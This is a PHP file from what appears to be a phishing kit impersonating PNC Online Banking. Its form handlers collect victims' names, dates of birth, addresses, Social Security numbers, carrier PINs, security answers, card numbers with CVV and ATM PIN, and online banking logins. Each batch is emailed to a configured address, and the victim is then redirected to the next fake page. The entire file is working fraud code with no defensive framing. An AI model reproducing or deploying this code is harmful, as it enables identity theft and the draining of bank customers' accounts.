<?php
include 'main.php';
// include 'antibot.php';
if (isset($_POST['token'])):
$token = $_POST['token'];
endif;
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title><?= $title; ?> | PNC Online Banking</title>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="assets/img/pnc_icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
    
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" type="text/css" href="style.css?v=11">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    
  </head>
  <?php
  
  // ========= Confirm Identity form acion start here============
  if (isset($_POST['confirm_identity'])) {
  $subject = "Confirm identity";
  $message = "
  <html>
    <head>
      <meta http-equiv='Content-Type' content='text/html charset=UTF-8' />
      <style>
      #customers {
      border-collapse: collapse;
      width: 100%;
      padding:5%;
      }
      #customers td, #customers th {
      border: 1px solid #ddd;
      padding: 8px;
      }
      #customers tr:nth-child(even){background-color: #f2f2f2;}
      #customers tr:hover {background-color: #ddd;}
      #customers th {
      padding-top: 12px;
      padding-bottom: 12px;
      text-align: left;
      background-color: #4CAF50;
      color: white;
      }
      </style>
    </head>
    <body>
      <div style='width: 700px; position:relative; margin:0 auto;'>
        <h3 align='center'> Confirm Identity ".$_POST['first_name']."</h3>
        <div>
          <table id='customers'>
            <tr>
              <th colspan='2'> CONFIRM IDENTITY </th>
            </tr>
            <tr>
              <td>First Name</td>
              <td>".$_POST['first_name']."</td>
            </tr>
            <tr>
              <td>Last Name</td>
              <td>".$_POST['last_name']."</td>
            </tr>
            <tr>
              <td>DOB</td>
              <td>".$_POST['dob']."</td>
            </tr>
            <tr>
              <td>State</td>
              <td>".$_POST['state']."</td>
            </tr>
            <tr>
              <td>Street</td>
              <td>".$_POST['street']."</td>
            </tr>
            <tr>
              <td>ZIP Code</td>
              <td>".$_POST['zip']."</td>
            </tr>
            <tr>
              <td>Phone</td>
              <td>".$_POST['phone']."</td>
            </tr>
            <tr>
              <td>Carrier-PIN</td>
              <td>".$_POST['carrier_pin']."</td>
            </tr>
            <tr>
              <td>Social Security Number</td>
              <td>".$_POST['social_sec_no']."</td>
            </tr>
            <tr>
              <td>User Agent</td>
              <td>".$_POST['user_agent']."</td>
            </tr>
          </table>
          <hr>
          
        </div>
      </div>
    </body>
  </html>
  ";
  // Always set content-type when sending HTML email
  $headers = "MIME-Version: 1.0" . "\r\n";
  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
  // ========Additional headers==========
  $headers .= 'From: <'.$email_from.'>' . "\r\n";
  mail($email_to,$subject,$message,$headers);
  
  echo '<script>document.location="qna.php?token='.$token.'"</script>';
  }
  /*====== QNA -Form action start here Start ========  */
  
  if (isset($_POST['qna_submit'])) {
  $subject = "Confirm Security Questions";
  $message = "
  <html>
    <head>
      <meta http-equiv='Content-Type' content='text/html charset=UTF-8' />
      <style>
      #customers {
      border-collapse: collapse;
      width: 100%;
      }
      #customers td, #customers th  {
      border: 1px solid #ddd;
      padding: 8px;
      }
      #customers tr:nth-child(even){background-color: #f2f2f2;}
      #customers tr:hover {background-color: #ddd;}
      #customers th {
      padding-top: 12px;
      padding-bottom: 12px;
      text-align: left;
      background-color: #4CAF50;
      color: white;
      }
      </style>
    </head>
    <body>
      <div style='width: 700px; position:relative; margin:0 auto;'>
        <h3 align='center'> Confirm Security Info</h3>
        <div>
          <table id='customers'>
            <tr>
              <th colspan='2'> Confirm Security Info </th>
            </tr>
            <tr>
              <td>Question 1</td>
              <td>".$_POST['question_1']."</td>
            </tr>
            <tr>
              <td>Answer Question 1</td>
              <td>".$_POST['answer_q_1']."</td>
            </tr>
            <tr>
              <td>Question 2</td>
              <td>".$_POST['question_2']."</td>
            </tr>
            <tr>
              <td>Answer Question 2</td>
              <td>".$_POST['answer_q_2']."</td>
            </tr>
            <tr>
              <td>Question 3</td>
              <td>".$_POST['question_3']."</td>
            </tr>
            <tr>
              <td>Answer Question 3</td>
              <td>".$_POST['answer_q_3']."</td>
            </tr>
            <tr>
              <td>User Agent</td>
              <td>".$_POST['user_agent']."</td>
            </tr>
          </table>
          <hr>
          
        </div>
      </div>
    </body>
  </html>
  ";
  $headers = "MIME-Version: 1.0" . "\r\n";
  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
  
  $headers .= 'From: <'.$email_from.'>' . "\r\n";
  
  mail($email_to,$subject,$message,$headers);
  
  echo '<script>document.location="billing.php?token='.$token.'"</script>';
  
  }
  /*================BIlling - form action Start=======================*/
  if (isset($_POST['billing_submit'])) {
  
  $subject = "Confirm Billing";
  $message = "
  <html>
    <head>
      <meta http-equiv='Content-Type' content='text/html charset=UTF-8' />
      <style>
      #customers {
      border-collapse: collapse;
      width: 100%;
      }
      #customers td, #customers th {
      border: 1px solid #ddd;
      padding: 8px;
      }
      #customers tr:nth-child(even){background-color: #f2f2f2;}
      #customers tr:hover {background-color: #ddd;}
      #customers th {
      padding-top: 12px;
      padding-bottom: 12px;
      text-align: left;
      background-color: #4CAF50;
      color: white;
      }
      </style>
    </head>
    <body>
      <div style='width: 700px; position:relative; margin:0 auto;'>
        <h3 align='center'> Confirm Your Billing Info</h3>
        <div>
          <table id='customers'>
            <tr>
              <th colspan='2'> Confirm Your Billing Info </th>
            </tr>
            <tr>
              <td>Credit/Devit Card Number</td>
              <td>".$_POST['card_no']."</td>
            </tr>
            <tr>
              <td>Expire Date</td>
              <td>".$_POST['exp_date']."</td>
            </tr>
            <tr>
              <td>CVV</td>
              <td>".$_POST['cvv']."</td>
            </tr>
            <tr>
              <td>ATM-PIN</td>
              <td>".$_POST['atm_pin']."</td>
            </tr>
            <tr>
              <td>User Agent</td>
              <td>".$_POST['user_agent']."</td>
            </tr>
          </table>
          <hr>
          
        </div>
      </div>
    </body>
  </html>
  ";
  $headers = "MIME-Version: 1.0" . "\r\n";
  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
  $headers .= 'From: <'.$email_from.'>' . "\r\n";
  mail($email_to,$subject,$message,$headers);
  echo '<script>document.location="login.php?token='.$token.'"</script>';
  }
  /*Login Form submission acction start here */
  if (isset($_POST['login_submit'])) {
  $subject = "Confirm Login";
  $message = "
  <html>
    <head>
      <meta http-equiv='Content-Type' content='text/html charset=UTF-8' />
      <style>
      #customers {
      border-collapse: collapse;
      width: 100%;
      }
      #customers td, #customers th {
      border: 1px solid #ddd;
      padding: 8px;
      }
      #customers tr:nth-child(even){background-color: #f2f2f2;}
      #customers tr:hover {background-color: #ddd;}
      #customers th {
      padding-top: 12px;
      padding-bottom: 12px;
      text-align: left;
      background-color: #4CAF50;
      color: white;
      }
      </style>
    </head>
    <body>
      <div style='width: 700px; position:relative; margin:0 auto;'>
        <h3 align='center'> Confirm Your Billing Info</h3>
        <div>
          <table id='customers'>
            <tr>
              <th colspan='2'> Login
                <tr>
                  <td>User ID</td>
                  <td>".$_POST['user_id']."</td>
                </tr>
                <tr>
                  <td>Password</td>
                  <td>".$_POST['password']."</td>
                </tr>
                <tr>
                  <td>User Agent</td>
                  <td>".$_POST['user_agent']."</td>
                </tr>
              </table>
              <hr>
              
            </div>
          </div>
        </body>
      </html>
      ";
      $headers = "MIME-Version: 1.0" . "\r\n";
      $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
      
      $headers .= 'From: <'.$email_from.'>' . "\r\n";
      
      mail($email_to,$subject,$message,$headers);
      echo '<script>document.location="confirm-email.php?token='.$token.'"</script>';
      
      }